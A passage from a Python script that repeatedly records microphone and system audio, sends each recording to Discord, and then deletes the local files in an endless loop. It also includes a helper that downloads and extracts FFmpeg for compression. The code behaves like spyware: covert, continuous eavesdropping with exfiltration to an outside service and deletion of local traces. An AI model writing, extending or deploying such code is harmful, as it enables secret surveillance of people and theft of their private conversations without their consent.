            with zipfile.ZipFile(temp_zip, 'r') as zip_ref:
                # Extract only the ffmpeg.exe file
                for file in zip_ref.namelist():
                    if file.endswith('ffmpeg.exe'):
                        source = zip_ref.open(file)
                        target = open(ffmpeg_path, "wb")
                        with source, target:
                            shutil.copyfileobj(source, target)
                        print(f"FFmpeg extracted to: {ffmpeg_path}")
                        break
            
            # Clean up the temporary zip file
            try:
                os.remove(temp_zip)
            except:
                pass
                
            # Verify the download worked
            if os.path.exists(ffmpeg_path):
                print("FFmpeg successfully installed!")
                return True
            else:
                print("Failed to extract FFmpeg.")
                return False
    except Exception as e:
        print(f"Error downloading FFmpeg: {e}")
        return False

def continuous_audio_recording():
    """Continuously record audio, send to Discord with delays, delete, and repeat."""
    global keep_recording
    
    print("Starting continuous audio recording loop...")
    
    # Check if FFmpeg is available, try to download if not
    check_and_download_ffmpeg()
    ffmpeg_available, _ = is_ffmpeg_installed()
    
    try:
        while keep_recording:
            try:
                # Record audio - now getting all three files
                print("\n--- Starting new audio recording session ---")
                combined_file, mic_file, system_file = record_audio(
                    duration=DEFAULT_RECORDING_DURATION, 
                    compress_audio=ffmpeg_available, 
                    sample_rate=22050, 
                    mp3_bitrate=96
                )
                
                # Check if files exist
                if (os.path.exists(combined_file) and os.path.exists(mic_file) and 
                    os.path.exists(system_file)):
                    # Send all files with delays between them
                    send_all_audio_files(combined_file, mic_file, system_file)
                else:
                    print("Some audio files were not created properly.")
                    # Try to send any files that were created
                    for file in [combined_file, mic_file, system_file]:
                        if os.path.exists(file) and os.path.getsize(file) > 0:
                            send_audio_to_discord(file)
                            try:
                                os.remove(file)
                            except:
                                pass
                    
                    # Short delay before retrying
                    time.sleep(5)
            
            except Exception as e:
                print(f"Error in recording iteration: {e}")
                import traceback
                traceback.print_exc()
                # Short delay before retrying if an error occurred
                time.sleep(5)
                
    except KeyboardInterrupt:
        print("Keyboard interrupt received. Stopping recording loop.")
        keep_recording = False
    
    print("Continuous recording loop has ended.")

def stop_recording():
    """Stop the continuous recording loop."""
    global keep_recording
    keep_recording = False
    print("Recording loop will stop after current recording completes.")

if __name__ == "__main__":
    try:
        # Start the continuous recording loop
        continuous_audio_recording()
    except Exception as e:
        print(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()
